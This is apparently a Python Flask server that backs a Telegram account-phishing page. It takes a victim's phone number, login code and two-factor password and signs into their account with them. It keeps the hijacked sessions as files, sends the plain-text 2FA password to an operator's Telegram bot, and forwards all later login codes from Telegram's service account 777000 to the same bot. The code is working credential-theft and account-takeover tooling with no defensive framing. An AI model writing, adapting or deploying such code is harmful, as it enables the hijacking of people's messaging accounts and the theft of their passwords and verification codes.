import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from dotenv import load_dotenv
import requests
import threading

# Загрузка переменных окружения
load_dotenv()

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')

app = Flask(__name__)
CORS(app)

SESSION_FOLDER = "sessions"
os.makedirs(SESSION_FOLDER, exist_ok=True)

def send_telegram_message(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={
            'chat_id': CHAT_ID,
            'text': text
        })
    except Exception as e:
        print("Ошибка отправки в Telegram:", e)

async def listen_for_messages(session_path):
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.start()

    @client.on(events.NewMessage(chats=777000))
    async def handler(event):
        msg = event.message.message
        print(f"[📥] Новое сообщение от 777000: {msg}")
        send_telegram_message(f"[📥] Сообщение от Telegram (777000):\n{msg}")

    print(f"🔄 Слушаем сообщения в {session_path}...")
    await client.run_until_disconnected()

def start_listener(session_path):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(listen_for_messages(session_path))

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "ok"})

@app.route('/start_login', methods=['POST'])
def start_login():
    data = request.get_json()
    phone = data.get('phone')

    if not phone:
        return jsonify({'error': 'Номер телефона обязателен'}), 400

    session_path = os.path.join(SESSION_FOLDER, phone.replace('+', '') + '.session')

    async def process():
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            result = await client.send_code_request(phone)
            await client.disconnect()
            send_telegram_message(f"📲 Код отправлен на {phone}")
            return {
                'status': 'code_sent',
                'phone_code_hash': result.phone_code_hash
            }
        else:
            await client.disconnect()
            return {'status': 'already_authorized'}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process())
        return jsonify(result)
    except Exception as e:
        send_telegram_message(f"❌ Ошибка start_login {phone}: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/submit_code', methods=['POST'])
def submit_code():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    phone_code_hash = data.get('phone_code_hash')

    if not all([phone, code, phone_code_hash]):
        return jsonify({'error': 'phone, code, phone_code_hash обязательны'}), 400

    session_path = os.path.join(SESSION_FOLDER, phone.replace('+', '') + '.session')

    async def process():
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            await client.disconnect()
            send_telegram_message(f"✅ Успешный вход {phone}")
            return {'status': 'logged_in'}
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'password_required'}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process())

        # 🔥 Запускаем слушателя сообщений после входа
        if result.get("status") == "logged_in":
            threading.Thread(target=start_listener, args=(session_path,), daemon=True).start()

        return jsonify(result)
    except Exception as e:
        send_telegram_message(f"❌ Ошибка submit_code {phone}: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/submit_password', methods=['POST'])
def submit_password():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')

    if not all([phone, password]):
        return jsonify({'error': 'phone и password обязательны'}), 400

    session_path = os.path.join(SESSION_FOLDER, phone.replace('+', '') + '.session')

    async def process():
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=password)
        await client.disconnect()
        send_telegram_message(
            f"🔐 2FA введён для {phone}\n"
            f"🔑 Пароль: {password}"
        )
        return {'status': 'logged_in'}

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(process())

        # 🔥 Запускаем слушателя сообщений после входа
        if result.get("status") == "logged_in":
            threading.Thread(target=start_listener, args=(session_path,), daemon=True).start()

        return jsonify(result)
    except Exception as e:
        send_telegram_message(f"❌ Ошибка submit_password {phone}: {e}")
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(port=5005)
